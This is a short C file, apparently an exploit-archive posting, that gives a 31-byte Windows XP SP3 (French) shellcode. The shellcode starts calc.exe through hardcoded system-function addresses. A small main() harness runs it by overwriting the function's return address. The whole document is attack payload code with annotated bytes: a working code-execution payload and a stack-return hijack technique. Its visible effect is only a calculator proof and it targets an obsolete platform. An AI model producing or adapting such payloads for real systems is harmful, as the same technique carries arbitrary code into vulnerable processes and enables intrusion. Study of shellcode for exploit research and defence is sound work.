/*
 | Title: Windows Xp Pro SP3 Fr (calc.exe) Shellcode 31 Bytes
 | Type: Shellcode
 | Author: agix
 | Platform: win32
*/

#include <stdio.h>

char shellcode[] =
"\xEB\x10" //jmp short 0x12
"\x5B" //pop ebx
"\x53" //push ebx
"\xBB\xAD\x23\x86\x7C" //mov ebx, 0x7c8623ad
"\xFF\xD3" //call ebx
"\xBB\xFA\xCA\x81\x7C" //mov ebx, 0x7c81cafa
"\xFF\xD3" //call ebx
"\xE8\xEB\xFF\xFF\xFF" //call dword 0x2
//db calc.exe
"\x63\x61\x6C\x63\x2E\x65\x78\x65";

int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
}